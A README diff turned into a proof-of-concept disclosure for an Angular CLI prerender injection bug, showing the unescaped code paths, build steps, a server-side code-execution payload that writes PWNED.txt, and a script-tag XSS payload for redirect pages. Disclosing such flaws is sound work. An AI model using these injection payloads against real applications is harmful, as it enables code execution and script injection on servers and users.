@@ -1,59 +1,116 @@
-# NgSsrPocRceXss
+# Angular CLI prerender parameter injection
 
-This project was generated using [Angular CLI](https://github.com/angular/angular-cli) version 22.2.0.
+`getPrerenderParams()` values are written into the generated server manifest and
+into generated redirect pages without escaping, so a row from the application's
+own backend becomes executable code in the SSR server and script in a static page.
 
-## Development server
+PoC for angular/angular-cli#33248.
 
-To start a local development server, run:
+## Cause
 
-```bash
-ng serve
+`manifest.ts` interpolates the route-derived asset path into generated ESM,
+twice per entry:
+
+```ts
+serverAssets[file.path] =
+  `{size: ${size}, hash: '${file.hash}', text: () => import('./${jsChunkFilePath}').then(m => m.default)}`;
 ```
 
-Once the server is running, open your browser and navigate to `http://localhost:4200/`. The application will automatically reload whenever you modify any of the source files.
-
-## Code scaffolding
-
-Angular CLI includes powerful code scaffolding tools. To generate a new component, run:
-
-```bash
-ng generate component component-name
+```ts
+  assets: {
+    ${Object.entries(serverAssets)
+      .map(([key, value]) => `'${key}': ${value}`)
+      .join(',\n    ')}
+  },
 ```
 
-For a complete list of available schematics (such as `components`, `directives`, or `pipes`), run:
+Sixty lines earlier the same route data reaches `routes:` through
+`JSON.stringify()`, where it is inert.
 
-```bash
-ng generate --help
+`utils.ts` builds the prerendered redirect page the same way:
+
+```ts
+    <meta http-equiv="refresh" content="0; url=${url}">
+  </head>
+  <body>
+    <pre>Redirecting to <a href="${url}">${url}</a></pre>
 ```
 
-## Building
+`{{ slug }}` in the Angular template escapes the identical value correctly.
 
-To build the project run:
+The generated configuration, the Router and the application code do not have to
+change. `angular.json` sets `"allowedHosts": ["localhost"]` only so the host
+check does not answer 400 before the bundle is imported.
 
-```bash
-ng build
-```
+## Run
 
-This will compile your project and store the build artifacts in the `dist/` directory. By default, the production build optimizes your application for performance and speed.
-
-## Running unit tests
-
-To execute unit tests with the [Vitest](https://vitest.dev/) test runner, use the following command:
+The backend serves the rows and the build output:
 
 ```bash
-ng test
+npm install
+npm run backend
 ```
 
-## Running end-to-end tests
-
-For end-to-end (e2e) testing, run:
+In a second terminal:
 
 ```bash
-ng e2e
+npm run build
+node --check dist/ng-ssr-poc-rce-xss/server/angular-app-manifest.mjs
+npm run serve:ssr:ng-ssr-poc-rce-xss &
+curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4000/
+cat PWNED.txt
 ```
 
-Angular CLI does not come with an end-to-end testing framework by default. You can choose one that suits your needs.
+The build succeeds, the manifest is valid ESM, and one request writes the file:
 
-## Additional Resources
+```text
+Prerendered 4 static routes.
+200
+rce
+```
 
-For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://angular.dev/tools/cli) page.
+The redirect page is only produced in static output mode:
+
+```bash
+npm run build:static
+```
+
+The ordinary rows produce ordinary paths, and the third produces `go/safe/`:
+
+```text
+go/newsletter/index.html
+go/safe/index.html
+go/spring-sale/index.html
+```
+
+Open <http://localhost:4300/go/safe/>.
+
+## Payload
+
+The product slug closes the asset key and runs as a computed method name:
+
+```text
+x'(){},[(function(){import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})})()](){},[`](){('
+```
+
+The path is emitted twice per entry, so the value has to parse in both
+positions. The backtick opens a template literal that swallows the second,
+mangled copy inside `import()`, and `](){('` closes the computed key and
+consumes the trailing `.mjs').then(m => m.default)}`:
+
+```js
+'product/x'(){},[(function(){import('fs').then(function(f){f.writeFileSync('PWNED.txt','rce')})})()](){},[`](){('/index.html': {size: 975, hash: '5b338b119c4ac504', text: () => import('./assets-chunks/product_x'(){},[(function(){import('fs')_then(function(f){f_writeFileSync('PWNED_txt','rce')})})()](){},[`](){('_index_html.mjs').then(m => m.default)},
+```
+
+The short link code breaks out of the `content` attribute:
+
+```text
+x"><script>alert('XSS - angular-cli 33248')</script>/../../safe
+```
+
+The output path is built with `posix.join()`, which collapses `..`, and the
+redirect target with `joinUrlParts()`, which does not, so the value is erased
+from the filename and kept in the page body.
+
+Two `..` because the value spans two path segments, and no `#`, which
+`new URL()` reads as a fragment and truncates.
